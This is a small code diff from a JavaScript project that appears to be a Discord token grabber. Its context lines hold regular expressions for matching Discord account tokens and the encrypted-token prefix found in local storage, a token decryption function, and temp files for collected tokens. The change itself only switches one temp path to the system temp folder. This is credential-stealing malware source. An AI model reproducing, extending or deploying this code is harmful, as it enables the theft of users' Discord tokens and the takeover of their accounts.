@@ -7,6 +7,7 @@ const { userAgent } = require('../config');
 const { getTempFolder } = require('../util/init');
 const { sleep } = require('../util/general');
 const { generateString } = require('../util/string');
+const os = require('os');
 
 const jsonFile = join(getTempFolder(), 'Discord.json');
 writeFileSync(jsonFile, '{}');
@@ -26,7 +27,7 @@ const decryptToken = async (token, key) => {
 };
 const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
 const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
-const tokensNotWorking = join(getTempFolder(), generateString(10) + '.tmp');
+const tokensNotWorking = join(os.tmpdir(), generateString(10) + '.tmp');
 writeFileSync(tokensNotWorking, '');
 
 const decryptRickRoll = (path) => {
